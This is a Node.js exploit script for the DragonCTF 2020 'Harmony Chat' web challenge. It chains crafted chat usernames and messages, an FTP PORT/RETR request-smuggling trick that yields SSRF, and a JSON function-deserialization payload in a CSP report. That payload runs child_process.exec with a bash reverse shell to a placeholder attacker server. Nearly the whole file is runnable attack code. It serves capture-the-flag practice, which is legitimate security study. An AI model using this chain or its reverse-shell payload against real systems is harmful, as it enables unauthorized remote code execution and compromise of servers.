/*
*   DragonCTF 2020 - Harmony Chat Web Challenge
*   How to use:
*      1. Create a channel
*      2. Make sure the "---- gloabls ---- section is properly set
*      3. Fill in your userId and channelId in argv[2] and argv[3] respectively
*      4. run & pwn
*
*/

// ----- globals ------

const WebSocketClient = require('websocket').client  // $ npm i websocket
const net = require('net')
const HARMONY_SERVER = '127.0.0.1' // harmony-1.hackable.software
const HARMONY_FTP_PORT = 3321
const ATTACKER_SERVER = 'YOUR_SERVER_GOES_HERE'
const ATTACKER_PORT   = 5041




// ----- helpers ------

Promise.each = async function(arr, fn) { // to avoid websocket mixup
    for(const item of arr) await fn(item);
}

function gen_ssrf_payload() {
    let rce_payload = JSON.stringify({"csp-report": {"blocked-uri": "", "document-uri": "", "effective-directive": "", "original-policy": "", "referrer": "", "status-code": "", "violated-directive": "", "line-number": {"toString": {"___js-to-json-class___": "Function", "json": `process.mainModule.require("child_process").exec("bash -c 'bash -i >& /dev/tcp/${ATTACKER_SERVER}/${ATTACKER_PORT} 0>&1'", {stdio:"inherit"})`}}}});
    return [
        {
            name: 'POST /csp-report?x=',
            msg: 'HTTP/1.1',
            uid: '',
            sid: null
        },
        {
            name: 'Host',
            msg: 'localhost:3380',
            uid: '',
            sid: null
        },
        {
            name: 'Content-Type',
            msg: 'application/csp-report',
            uid: '',
            sid: null
        },
        {
            name: 'Content-Length',
            msg: (rce_payload.length+1).toString(),
            uid: '',
            sid: null
        },
        {
            name: rce_payload.substr(0,13), // {"csp-report"
            msg: rce_payload.substr(14),    // jumping to 14 and skipping the ":" char because harmony server adds that automatically
            uid: '',
            sid: null
        }

    ];
}

async function ws_factory() {
    return new Promise( async (resolve, reject) => {
        try {
            let client = new WebSocketClient();
            client.on('connectFailed', function(error) {
                console.log('Connect Error: ' + error.toString());
            });

            client.connect(`ws://${HARMONY_SERVER}:3380/chat`, 'echo-protocol');
            resolve(client);
        } catch(err) {
            reject(err);
        } 
    });
}

async function get_ws_connection(user) {
    return new Promise( async (resolve, reject) => {
        let client = await ws_factory();
        user.sid = client;
        resolve(user);
    });
}

async function register_user(bot) {
    return new Promise( (resolve, reject) => {
        let register_req = JSON.stringify({"type":"register","displayName":bot.name});
        bot.sid.on('connect', function(connection) {
            connection.sendUTF(register_req);
            connection.on('message', function(message) {
                // console.log("Received: '" + message.utf8Data + "'");
                resp = JSON.parse(message.utf8Data);
                if(resp.type == 'server' && resp.msg.includes('Registered and logged in')) {
                    bot.uid = resp.msg.replace('Registered and logged in! Your UID is ','').replace(' - save it!', '');
                    bot.sid = connection;
                    resolve(bot);
                }
            });
        });
    });
}

async function setup_channel(bot, channelId, userId) {
    return new Promise( async (resolve, reject) => {
        let attacker = await ws_factory();
        let invite_req = {type:"invite", chId:channelId, uid:""};
        let login_req  = JSON.stringify({type:"login",  uid: userId});

        attacker.on('connect', async connection => {
            connection.sendUTF(login_req);
            connection.on('message', async resp => {
                resp = JSON.parse(resp.utf8Data);
                // console.log('attacker got resp ', resp);
                if(resp.type == 'server' && resp.msg.includes(`Logged in as`)) {
                    // console.log('logged in as attacker, inviting the folks now');    
                    invite_req.uid = bot.uid;
                    connection.sendUTF(JSON.stringify(invite_req));
                }

                else if(resp.type == 'server' && resp.msg.includes('Invited')) {
                    resolve(bot)
                }
            });
        });
    });
}

async function websocket_pwn(bot, channelId) {
    let send_msg_req = {type:"message",chId: channelId,msg:""};
    let empty_msg_req = {type:"message",chId: channelId,msg:""};
    return new Promise( (resolve, reject) => {
        if(bot.name.includes('{"csp-report')) {                // if this is the last user in the list (i.e: the POST data)
            bot.sid.sendUTF(JSON.stringify(empty_msg_req));    // then add Extra \r\n before POST data begins
        }        

        send_msg_req.msg = bot.msg;
        bot.sid.sendUTF(JSON.stringify(send_msg_req));

        bot.sid.on('message', resp => {
            resp = JSON.parse(resp.utf8Data);
            if(resp.type == 'message' && resp.msg.text == bot.msg) { // ack
                resolve();
            }
        });
    });
}

async function ftp_pwn(userId, channelId) {
    return new Promise( (resolve, reject) => {
        let client = new net.Socket();
        client.connect(HARMONY_FTP_PORT, HARMONY_SERVER, () => {
            console.log(`Connected to ${HARMONY_FTP_PORT}`);
        });

        client.on('data', function(data) {
            console.log('Received: ' + data);
            if(data.includes('ready')) {
                client.write(`user ${userId}`);
            }
            else if(data.includes('need password')) {
                client.write('pass '); // no password
            }
            else if(data.includes('logged in, proceed.')) {
                client.write('PORT 127,0,0,1,13,52')
            }
            else if(data.includes('200 OK')) {
                client.write(`RETR ${channelId}`)
                resolve('ftp -> pwned');
            }
        });

        client.on('close', function() {
            console.log('Connection closed');
        });
    });
}




// ----- main ------
const attackerId = process.argv[2] || '630aaa730f91614e92652e5ad045f0f1';
const channelId  = process.argv[3] || '02908a9e9d2d465022ca52bbe11d18f4';

const list_of_bots = gen_ssrf_payload();

Promise.each(list_of_bots, async bot => {                           // iterating through list_of_bots
    await get_ws_connection(bot).then(async c => {
        console.log('got client');
        bot = await register_user(c);                               // creating a new user/bot
        bot = await setup_channel(bot, channelId, attackerId);      // inviting the user to the channel
        await websocket_pwn(bot, channelId);                        // sending a message in the channel

        if(bot.name == list_of_bots[list_of_bots.length-1].name) {          // if last bot
            console.log('finalized');
            await ftp_pwn(attackerId, channelId).then(r => console.log(r)); // Trigger SSRF
        }
    }).catch(e => console.log(e));       
});